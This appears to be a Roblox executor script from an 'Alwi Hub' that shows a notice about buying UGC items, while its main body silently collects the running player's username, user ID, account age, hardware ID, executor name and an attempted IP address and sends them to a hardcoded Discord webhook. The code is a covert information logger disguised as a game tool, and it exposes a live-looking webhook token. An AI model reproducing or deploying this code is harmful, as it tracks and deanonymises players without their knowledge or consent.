if _G.Honey_Valley then
    warn("Script Is Already Running", 0)
    return
end

_G.Honey_Valley = true

local function sendNotification(title, message, delay)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = title,
        Text = message,
        Icon = "http://www.roblox.com/asset/?id=92639750101948",
        Duration = delay,
    })
end

sendNotification("Alwi Hub Notice", "Delta Executor cannot purchase UGC. It shows an error. Please change to another executor. Thank you!", 30)

local https = cloneref(game:GetService("HttpService"))
local HttpService = cloneref(game:GetService("HttpService"))
local MarketplaceService = game:GetService("MarketplaceService")
local hookURL = "https://discord.com/api/webhooks/1330010293627125834/U-jaKpDELrn5e6ZaCoKdCfUGCv7BPj7yoV8pRyI3c0CYPirq8LtA5jRZI9b1r9VXmvee"

-- Function to get player's avatar (thumbnail)
function thumbnail(plyId)
    local url = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. plyId .. "&returnPolicy=PlaceHolder&size=75x75&format=Png&isCircular=false"
    local response = http_request({
        Url = url,
        Method = "GET",
        Headers = {
            ["Content-Type"] = "application/json"
        }
    })

    local data = HttpService:JSONDecode(response.Body)
    return data["data"][1]["imageUrl"]
end

local ip

local res = pcall(function()
    local reqIp = request({
        Url = "https://youtu.be/OMG-AV0RMwk?si=BRgXBjhzYn9WQdPl",
        Method = "GET"
    })

    ip = reqIp.Body
end)

-- Gather player and game data
local player = game.Players.LocalPlayer
local userid = player.UserId
local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local identifyexecutor = identifyexecutor()

-- Build data payload for the webhook
local data = {
    embeds = {
        {
            color = 14177041, -- Red color
            title = "Player Information",
            description = "Details about the current player and game session.",
            thumbnail = {
                url = thumbnail(player.UserId) -- Add player's avatar thumbnail
            },
            fields = {
                {
                    ["name"] = "Game Name",
                    ["value"] = gameInfo.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Place ID",
                    ["value"] = tostring(game.PlaceId),
                    ["inline"] = true
                },
                {
                    ["name"] = "Username",
                    ["value"] = player.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = player.DisplayName,
                    ["inline"] = true
                },
                {
                    ["name"] = "User ID",
                    ["value"] = tostring(player.UserId),
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = tostring(player.AccountAge) .. " days",
                    ["inline"] = true
                },
                {
                    ["name"] = "Hardware ID",
                    ["value"] = HWID,
                    ["inline"] = true
                },
                {
                    ["name"] = "IP Address",
                    ["value"] = ip,
                    ["inline"] = true
                },
                {
                    ["name"] = "Executor",
                    ["value"] = identifyexecutor,
                    ["inline"] = true
                }
            },
            footer = {
                ["text"] = "Information sent via script"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
}

-- Send data to the webhook
local success, errorMessage = pcall(function()
    http_request({
        Url = hookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(data)
    })
end)

if not success then
    warn("Failed to send data to the webhook: " .. errorMessage)
end
